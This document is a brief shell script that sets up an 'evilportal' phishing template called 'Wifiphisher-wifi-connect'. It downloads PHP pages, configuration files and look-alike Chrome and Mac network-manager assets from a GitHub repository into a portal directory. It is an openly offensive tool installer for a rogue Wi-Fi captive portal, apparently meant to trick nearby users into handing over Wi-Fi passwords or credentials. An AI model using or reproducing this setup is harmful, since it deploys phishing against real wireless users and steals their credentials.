

echo "[-] Creating new evilportal template 'Wifiphisher-wifi-connect' at /root/portals/"
mkdir /root/portals/Wifiphisher-wifi-connect
cd /root/portals/Wifiphisher-wifi-connect

echo "[-] Downloading template using wget..."

wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/index.php
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/MyPortal.php
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/Evilportal_wifi_connect.ep
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/config.ini
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/config.php
mkdir static
cd static
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/behavior.js
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/win-behavior.js
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/dinosaur.png
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/mac-network-manager.css
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/opensans.ttf
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/style.css
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/chrome-offline.css
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/jquery.js
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/opensans.css
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/question.png
wget https://raw.githubusercontent.com/teabot5000/Evilportal-wifi-connect/master/wifi-icon.png

echo "[-] Done!"